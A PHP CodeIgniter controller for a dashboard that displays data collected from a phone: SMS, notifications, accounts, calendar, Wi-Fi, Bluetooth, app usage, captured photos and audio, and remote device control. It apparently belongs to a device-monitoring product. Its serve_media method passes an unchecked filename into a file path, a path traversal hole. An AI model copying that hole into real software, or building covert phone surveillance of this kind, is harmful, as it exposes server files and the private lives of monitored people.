<?php

namespace App\Controllers\clients;

use App\Models\Mod_Crypt;
use CodeIgniter\API\ResponseTrait;

class Advanced extends BaseClientController
{
    use ResponseTrait;

    private const DETAIL_PER_PAGE = 50;

    private function commonData(string $active, string $title): array
    {
        $counts = $this->getUserDataCounts();
        return array_merge($counts, [
            'pag' => 'advanced',
            'title' => $title,
            'nav_urls' => $this->getAdvancedNavUrls($active, $counts),
            'active_tab' => $active,
        ]);
    }

    /**
     * Navigation tabs shared across all advanced pages.
     */
    private function getAdvancedNavUrls(string $activeView, array $counts = []): string
    {
        $tabs = [
            'device_context' => ['url' => 'advanced/device', 'label' => 'Device', 'icon' => 'fas fa-battery-three-quarters', 'count' => $counts['total_device'] ?? 0],
            'network_info' => ['url' => 'advanced/network', 'label' => 'Network', 'icon' => 'fas fa-wifi', 'count' => $counts['total_network'] ?? 0],
            'accounts' => ['url' => 'advanced/accounts', 'label' => 'Accounts', 'icon' => 'fas fa-user-circle', 'count' => $counts['total_accounts'] ?? 0],
            'calendar' => ['url' => 'advanced/calendar', 'label' => 'Calendar', 'icon' => 'fas fa-calendar-alt', 'count' => $counts['total_calendar'] ?? 0],
            'app_usage' => ['url' => 'advanced/app-usage', 'label' => 'Usage', 'icon' => 'fas fa-chart-pie', 'count' => $counts['total_app_usage'] ?? 0],
            'notifications' => ['url' => 'advanced/notifications', 'label' => 'Alerts', 'icon' => 'fas fa-bell', 'count' => $counts['total_notifications'] ?? 0],
            'bluetooth' => ['url' => 'advanced/bluetooth', 'label' => 'Bluetooth', 'icon' => 'fab fa-bluetooth-b', 'count' => $counts['total_bluetooth'] ?? 0],
            'sensors' => ['url' => 'advanced/sensors', 'label' => 'Sensors', 'icon' => 'fas fa-microchip', 'count' => $counts['total_sensors'] ?? 0],
            'security_audit' => ['url' => 'advanced/security_audit', 'label' => 'Security', 'icon' => 'fas fa-shield-alt', 'count' => $counts['total_security_audit'] ?? 0],
            'remote_media' => ['url' => 'advanced/media', 'label' => 'Remote Media', 'icon' => 'fas fa-photo-video', 'count' => $counts['total_media'] ?? 0],
        ];

        $html = '<div class="d-flex justify-content-end flex-wrap mb-3" style="gap: 5px;">';
        foreach ($tabs as $key => $tab) {
            $active = ($key === $activeView) ? 'active' : '';
            $btnClass = ($key === $activeView) ? 'btn-primary' : 'btn-outline-primary';
            $html .= sprintf(
                '<a class="btn btn-sm %s %s" href="%s"><i class="%s mr-1"></i> %s <span class="badge %s ml-1" style="opacity: 0.8;">%d</span></a>',
                $btnClass,
                $active,
                base_url($tab['url']),
                $tab['icon'],
                $tab['label'],
                ($key === $activeView ? 'badge-light' : 'badge-primary'),
                $tab['count']
            );
        }
        $html .= '</div>';

        return $html;
    }

    /** GET /advanced/device */

    public function device_context()
    {
        $data = array_merge($this->commonData('device_context', 'Device Context'), [
            'rows' => $this->finderModel->get_device_context($this->userId),
            'total' => $this->finderModel->get_count_DeviceContext($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/device_context', $data);
    }

    /** GET /advanced/network */
    public function network_info()
    {
        $rows = $this->finderModel->get_network_info($this->userId);
        // Attach nearby wifi to each row
        foreach ($rows as &$row) {
            $row['nearby_wifi'] = $this->finderModel->get_nearby_wifi($row['id']);
        }
        $data = array_merge($this->commonData('network_info', 'Network Info'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_NetworkInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/network_info', $data);
    }

    /** GET /advanced/accounts */
    public function accounts()
    {
        $data = array_merge($this->commonData('accounts', 'Device Accounts'), [
            'rows' => $this->finderModel->get_accounts($this->userId),
            'total' => $this->finderModel->get_count_Accounts($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/accounts', $data);
    }

    /** GET /analysis/advanced_timeline */
    public function timeline()
    {
        $events = $this->finderModel->get_timeline_events($this->userId, 50);

        // Enrich events (e.g. decode SMS)
        foreach ($events as &$ev) {
            if ($ev['event_type'] === 'sms' && !empty($ev['meta2'])) {
                $ev['meta2'] = base64_decode($ev['meta2']);
            }
        }

        $total = $this->finderModel->get_count_timeline_events($this->userId);

        $data = array_merge($this->commonData('timeline', 'Device Timeline'), [
            'events' => $events,
            'total' => $total,
            'pager' => $this->finderModel->getPager(),
            'pag' => 'timeline', // Ensure sidebar makes Timeline active!
        ]);

        return $this->renderAppView('users/advanced/timeline', $data);
    }

    /** GET /advanced/calendar */
    public function calendar()
    {
        $data = array_merge($this->commonData('calendar', 'Calendar Events'), [
            'rows' => $this->finderModel->get_calendar_events($this->userId),
            'total' => $this->finderModel->get_count_Calendar($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/calendar', $data);
    }

    /** GET /advanced/app-usage */
    public function app_usage()
    {
        $rows = $this->enrichAppUsageGroupedRows(
            $this->finderModel->get_app_usage_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('app_usage', 'App Usage'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_app_usage_packages($this->userId),
            'total_snapshots' => $this->finderModel->get_count_AppUsage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/app_usage', $data);
    }

    /** GET /advanced/app-usage/{package} */
    public function app_usage_detail(string $encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_app_usage_package_summary($this->userId, $packageName);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $sessions = $this->enrichAppUsageSessions(
            $this->finderModel->get_app_usage_sessions_for_package(
                $this->userId,
                $packageName,
                self::DETAIL_PER_PAGE
            )
        );

        $summary['last_used_display'] = $this->formatMsDatetime($summary['last_time_used'] ?? null, 'M d, Y, l H:i');

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $packageName);

        $data = array_merge($this->commonData('app_usage', 'App Usage — ' . ($summary['app_name'] ?? $packageName)), [
            'rows' => $this->enrichAppUsageDetailRows(
                $this->finderModel->get_app_usage_for_package($this->userId, $packageName, self::DETAIL_PER_PAGE)
            ),
            'total' => $this->finderModel->get_count_app_usage_for_package($this->userId, $packageName),
            'pager' => $this->finderModel->getPager(),
            'package_name' => $packageName,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'sessions' => $sessions,
            'back_url' => base_url('advanced/app-usage'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/app_usage', $data);
    }

    /** GET /advanced/notifications */
    public function notifications()
    {
        $rows = $this->enrichNotificationGroupedRows(
            $this->finderModel->get_notifications_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('notifications', 'Notifications'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_notification_groups($this->userId),
            'total_notifications' => $this->finderModel->get_count_Notifications($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/notifications', $data);
    }

    /** GET /advanced/notifications/{group} */
    public function notification_detail(string $encodedPkg)
    {
        $groupKey = $this->decodePackageSegment($encodedPkg);
        if ($groupKey === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_notifications_group_summary($this->userId, $groupKey);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary['latest_ts_abs'] = $this->formatMsDatetime($summary['latest_timestamp'] ?? null, 'M d, Y, l H:i');
        $summary['latest_ts_rel'] = $this->formatRelativeTime($summary['latest_timestamp'] ?? null);

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $groupKey);

        $data = array_merge($this->commonData('notifications', 'Notifications — ' . ($summary['display_name'] ?? $groupKey)), [
            'rows' => $this->enrichNotificationDetailRows(
                $this->finderModel->get_notifications_for_group($this->userId, $groupKey, self::DETAIL_PER_PAGE)
            ),
            'total' => $this->finderModel->get_count_notifications_for_group($this->userId, $groupKey),
            'pager' => $this->finderModel->getPager(),
            'group_key' => $groupKey,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'back_url' => base_url('advanced/notifications'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/notifications', $data);
    }

    /**
     * Decode a URL segment back to a plain package/group name.
     * Segment is simply urlencode()'d — e.g. com.twitter.android stays as-is.
     */
    private function decodePackageSegment(string $segment): ?string
    {
        if ($segment === '') {
            return null;
        }

        $decoded = urldecode($segment);

        return ($decoded !== '') ? $decoded : null;
    }

    /**
     * Encode a package/group name for safe use in a URL segment.
     * urlencode() percent-encodes special chars; dots and letters pass through unchanged.
     */
    private function encodePackageSegment(string $value): string
    {
        return urlencode($value);
    }

    private function formatMsDatetime($msTimestamp, string $format = 'Y-m-d H:i:s'): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        return date($format, (int) floor((int) $msTimestamp / 1000));
    }

    private function formatRelativeTime($msTimestamp): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        $seconds = (int) floor((int) $msTimestamp / 1000);
        $diff = time() - $seconds;

        if ($diff < 60) {
            return 'just now';
        }
        if ($diff < 3600) {
            return (int) floor($diff / 60) . ' min ago';
        }
        if ($diff < 86400) {
            return (int) floor($diff / 3600) . ' h ago';
        }
        if ($diff < 604800) {
            return (int) floor($diff / 86400) . ' d ago';
        }

        return date('Y-m-d H:i', $seconds);
    }

    private function enrichAppUsageGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $row['last_used_display'] = $this->formatMsDatetime($row['last_time_used'] ?? null, 'M d, Y, l H:i');
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['package_url_enc'] = urlencode((string) ($row['package_name'] ?? ''));
        }

        return $rows;
    }

    private function enrichNotificationGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['latest_timestamp'] ?? null;
            $row['latest_ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['latest_ts_rel'] = $this->formatRelativeTime($ts);
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['group_url_enc'] = urlencode((string) ($row['group_key'] ?? ''));
            $row['latest_title_short'] = mb_strimwidth($row['latest_title'] ?? '—', 0, 60, '…');
        }

        return $rows;
    }

    private function enrichAppUsageDetailRows(array $rows): array
    {
        $count = count($rows);
        for ($i = 0; $i < $count; $i++) {
            $rows[$i]['last_used_display'] = $this->formatMsDatetime($rows[$i]['last_time_used'] ?? null, 'M d, Y, l H:i');
            $rows[$i]['extracted_display'] = $this->formatMsDatetime($rows[$i]['extracted_at'] ?? null, 'M d, Y, l H:i');

            if ($i < $count - 1) {
                $currentMs = (int) ($rows[$i]['foreground_time_ms'] ?? 0);
                $prevMs = (int) ($rows[$i + 1]['foreground_time_ms'] ?? 0);

                $diffMs = $currentMs - $prevMs;
                if ($diffMs < 0) {
                    $diffMs = $currentMs;
                }
                $rows[$i]['time_taken_ms'] = $diffMs;
            } else {
                $rows[$i]['time_taken_ms'] = null;
            }
        }

        return $rows;
    }

    private function enrichAppUsageSessions(array $sessions): array
    {
        foreach ($sessions as &$row) {
            $row['timestamp_display'] = $this->formatMsDatetime($row['timestamp'] ?? null, 'M d, Y, l H:i');
        }

        return $sessions;
    }

    private function enrichNotificationDetailRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['notification_timestamp'] ?? null;
            $row['ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['ts_rel'] = $this->formatRelativeTime($ts);
        }

        return $rows;
    }

    /** GET /advanced/bluetooth */
    public function bluetooth()
    {
        $rows = $this->finderModel->get_bluetooth($this->userId);
        $data = array_merge($this->commonData('bluetooth', 'Bluetooth'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_Bluetooth($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/bluetooth', $data);
    }

    /** GET /advanced/sensors */
    public function sensors()
    {
        $data = array_merge($this->commonData('sensors', 'Sensor Profile'), [
            'rows' => $this->finderModel->get_sensor_profile($this->userId),
            'total' => $this->finderModel->get_count_Sensors($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/sensors', $data);
    }

    /** GET /advanced/security_audit */
    public function security_audit()
    {
        $rows = $this->finderModel->get_security_audit($this->userId);
        foreach ($rows as &$r) {
            $r['ts_display'] = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
        }
        unset($r);
        $data = array_merge($this->commonData('security_audit', 'Security Audit'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_SecurityAudit($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/security_audit', $data);
    }

    /** GET /remote-device */
    public function remote_device()
    {
        $userModel = new \App\Models\Mod_User();
        $devices = $userModel->get_user_devices_from_profile($this->userId);

        $targetDevice = null;
        $deviceIds = array_column($devices, 'device_id');

        if (!empty($deviceIds)) {
            $db = \Config\Database::connect();
            $targetDevice = $db->table('tbl_device_profile')
                ->whereIn('device_id', $deviceIds)
                ->where('fcm_token !=', '')
                ->where('fcm_token IS NOT NULL')
                ->orderBy('counter', 'DESC') // Bottom-most record in the table
                ->get()
                ->getRowArray();
        }

        $counts = $this->getUserDataCounts();
        $data = array_merge($counts, [
            'pag' => 'remote_device',
            'title' => 'Remote Device Control',
            'targetDevice' => $targetDevice
        ]);

        return $this->renderAppView('users/advanced/remote_device', $data);
    }

    /** GET /advanced/media */
    public function remote_media()
    {
        $data = array_merge($this->commonData('remote_media', 'Remote Media Forensic'), [
            'rows' => $this->finderModel->get_captured_media($this->userId),
            'total' => $this->finderModel->get_count_CapturedMedia($this->userId),
        ]);
        return $this->renderAppView('users/advanced/remote_media', $data);
    }

    /** GET /advanced/media/serve/(:any) */
    public function serve_media($filename)
    {
        $path = WRITEPATH . 'uploads/captured/' . $filename;
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $filename;
        }

        if (!file_exists($path)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $mimeType = mime_content_type($path);
        return $this->response
            ->setHeader('Content-Type', $mimeType)
            ->setBody(file_get_contents($path));
    }

    /** POST /advanced/media/delete/(:num) */
    public function delete_media($id)
    {
        $media = $this->finderModel->get_captured_media_by_id($id, $this->userId);
        if (!$media) {
            return $this->failNotFound('Media record not found');
        }

        // Delete physical file
        $path = WRITEPATH . 'uploads/captured/' . $media['stored_filename'];
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $media['stored_filename'];
        }

        if (file_exists($path)) {
            @unlink($path);
        }

        // Delete database record
        if ($this->finderModel->delete_captured_media($id, $this->userId)) {
            return $this->respondDeleted(['success' => true, 'message' => 'Media deleted successfully']);
        }

        return $this->fail('Failed to delete media record');
    }

    /** POST /advanced/notifications/delete/(:any) */
    public function delete_notifications_by_app($pkgEnc = null)
    {
        // Support both route segment and POST data
        if ($pkgEnc === null) {
            // Try POST parameter first, then URI segment
            $pkgEnc = $this->request->getPost('pkg') ?? $this->request->uri->getSegment(4);
        }
        $packageName = $this->decodePackageSegment($pkgEnc);
        if (!$packageName) {
            // Set flash error and redirect back
            $this->session->setFlashdata('error', 'Invalid package name');
            return redirect()->to(base_url('advanced/notifications'));
        }
        if ($this->finderModel->delete_notifications_by_app($this->userId, $packageName)) {
            $this->session->setFlashdata('success', 'All notifications for the app have been deleted');
            return redirect()->to(base_url('advanced/notifications'));
        }
        $this->session->setFlashdata('error', 'Failed to delete notifications for the app');
        return redirect()->to(base_url('advanced/notifications'));
    }
}
